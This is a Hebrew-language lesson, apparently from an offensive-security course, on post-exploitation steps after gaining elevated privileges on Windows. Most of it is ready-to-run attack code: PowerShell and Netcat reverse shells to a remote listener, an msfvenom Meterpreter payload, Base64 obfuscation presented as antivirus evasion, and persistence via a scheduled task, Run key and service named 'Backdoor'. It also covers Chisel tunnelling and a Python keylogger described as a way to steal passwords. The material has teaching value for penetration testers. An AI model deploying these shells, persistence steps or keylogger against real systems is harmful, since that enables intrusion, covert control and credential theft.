    הצלחנו להסלים הרשאות בווינדוס, מה עכשיו?¶

    בעיות עם כלים בווינדוס¶

    בניגוד ללינוקס, בווינדוס יש שכבות רבות של הגנה שמונעות מאיתנו להריץ כלים חיצוניים. האנטי-וירוסים, Windows Defender, ו-System Integrity Protection (SIP) מונעים מאיתנו גישה ישירה להרבה מהפעולות שנרצה לבצע. לכן, נצטרך למצוא דרכים לעקוף הגנות אלו או להשתמש בטכניקות שמסוות את הפעולות שלנו.

    קצת על reverse shell בווינדוס¶

    בווינדוס ניתן להשתמש ב-PowerShell או ב-Netcat כדי ליצור חיבור הפוך, אך רבים מהכלים הללו מזוהים כחלק ממנגנוני ההגנה.

    יצירת reverse shell באמצעות PowerShell:¶

    $client = New-Object System.Net.Sockets.TCPClient("10.0.0.1", 4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
while ($true) {
    $cmd = $reader.ReadLine();
    $output = iex $cmd 2>&1 | Out-String;
    $writer.WriteLine($output);
    $writer.Flush();
}

    יצירת reverse shell באמצעות Netcat:¶

    nc.exe -e cmd.exe 10.0.0.1 4444

    הפיכת Shell בסיסי ל-Shell אינטראקטיבי¶

    כאשר אנו מקבלים shell בווינדוס, לרוב הוא מוגבל מאוד ואינו מספק חווית עבודה טובה. ניתן לשדרג את ה-shell לאינטראקטיבי יותר באמצעות ConPTY:

    $proc = Start-Process -FilePath "cmd.exe" -PassThru -NoNewWindow;
$proc.Id

    ניתן גם להשתמש ב-PowerShell Empire, שמאפשר חיבור חזק יותר: https://github.com/EmpireProject/Empire
    קראו על הכלי!

    כלי סייבר מתקדמים בווינדוס¶

    הכלי Cobalt Strike¶

    הכלי Cobalt Strike הוא כלי מתקדם לניהול התקפות ולביצוע post-exploitation. הכלי משמש לניהול shell-ים, לתקיפה בתוך הרשת, ולהפצת קוד זדוני בין מחשבים.
    - https://www.cobaltstrike.com/

    הכלי Sliver¶

    הכלי Sliver כמו בלינוקס, זמין גם בווינדוס
    - https://github.com/BishopFox/sliver

    הכלי Meterpreter (Metasploit Framework)¶

    Meterpreter מאפשר לנו שליטה מלאה על המערכת עם מגוון רחב של יכולות, כולל העברת קבצים, צילום מסך, והחדרת processes.

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
    • ומתנצל לפוצץ לכם את הבועה, אף אחד מהכלים האלו לא יעבוד לכם אם יש defender או כל אנטי-ווירוס כזה או אחר דלוק.

    דרכים לעקוף אנטי-וירוסים בווינדוס¶

    אנטי-וירוסים בווינדוס קופצים לא רק על כלי סייבר, אלה גם על הרצת פקודות powershell מסויימות אפילו דרך webshell או revershell
    אז לשם כך יש המון טכניקות באמצעותם אפשר להריץ פקודות powershell בקצת יותר זהירות.
    - אפילו קיים בווינדוס את מנגנון ה AMSI Bypass שכל מהותו הוא לנטר על סקריפטים שרצים בווינדוס ולמנוע זדוניות- (powershell, vbs, batch וכו.)

    שימוש ב-Obfuscation ב-PowerShell¶

    אובפוסקציה בגדול היא התהליך שבו אנחנו מנסים להסתיר קוד מסוים, כדי שלא יוכלו להבין אותו בקלות- נועד למשל לבלבל אנטי-ווירוסים.
    ניתן להשתמש בטכניקות כגון Base64 Encoding:

    $cmd = "[System.Net.Dns]::GetHostName()";
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd));
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded));
iex $decoded;

    קיימות עוד המון טכניקות מוכרות, כמו למשל
    - טכניקות Process Hollowing שבה יוצרים process חוקי (למשל, explorer.exe), ובתוכו מזריקים קוד זדוני.
    - עקיפות מוכרות של מגנון AMSI Bypass

    אומנם, קורס זה הוא לא בשביל פיתוח כלי סייבר, כך שלא אלמד winapi, פיתוח מתקדם בCPP \ C אז גם לממש את טכניקה זו אני לא אלמד.
    אך מוזמנים לעשות את קורסי פיתוח הlow level שלנו- כדי להתחיל את ההתמקצעות בעולם פיתוח הכלי סייבר.

    שיטות פרסיסטנטיות בווינדוס¶

    כמו בלינוקס, גם פה אנחנו צריכים כלים פרסיסטנטים.

    יצירת משימה מתוזמנת (Scheduled Task)¶

    schtasks /create /tn "Backdoor" /tr "C:\Users\Public\backdoor.exe" /sc onlogon /ru SYSTEM

    שימוש ב-Registry Run Key¶

    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Users\Public\backdoor.exe" -PropertyType String

    יצירת שירות מערכת (Windows Service)¶

    sc.exe create Backdoor binPath= "C:\Users\Public\backdoor.exe" start= auto

    יצירת טינול (Tunneling) וחיבורי Proxy¶

    הכלי Chisel¶

    כלי Chisel כמו בלינוקס קיים גם בווינודס! מואפשר לנו לבנות טינול מאובטח דרך מחשב פגיע.

    הפעלת Chisel Server:

    chisel server --reverse --port 8080

    הפעלת Chisel Client:

    chisel client 192.168.1.100:8080 R:1080:127.0.0.1:3389

    פיתוח כלי סייבר מותאמים לווינדוס¶

    כמו שכתבתי למעלה, וגם בהרצאה על לינוקס, לפתח כלי סייבר זה מאוד קשה.
    ואפילו קשה יותר בווינדוס, כי בווינדוס יש המון הגנות באין בלינוקס- וזה דורש ידע רב של מערכת ההפעלה, איך לכתוב קוד שיודע לתקשר עם מערכת ההפעלה (עם winapi) ועוד.
    כמובן שיכולת בסיסית מאוד בפיתוח כלים נדרשת בעולם הבדיקת חדירות והמחקר האבטחתי אך לא חובה.

    ולמורות שלפתח כלי סייבר שדפנדר לא קופץ עליו זה מאוד מאתגר, עדיין קיימים עמוק באינטרנט כל מיני כליי סייבר קטנים ומינימלים- לא מוכרים שדפנדר עדיין לא הגיעו אילו.

    דוגמא: יצירת Keylogger בסיסי ב-Python¶

    יצירת כלי keylogger פשוט בפייתון שיודע לשמור את המקשים שנכתבים במקלדת.

    from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(f"{key}\n")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()

    ניתן להשתמש בkeylogger כזה כדי לעקוב אחרי ההקלות של המשתמש- בדרך כלל משומש לצורך גניבת סיסמאות וכו.
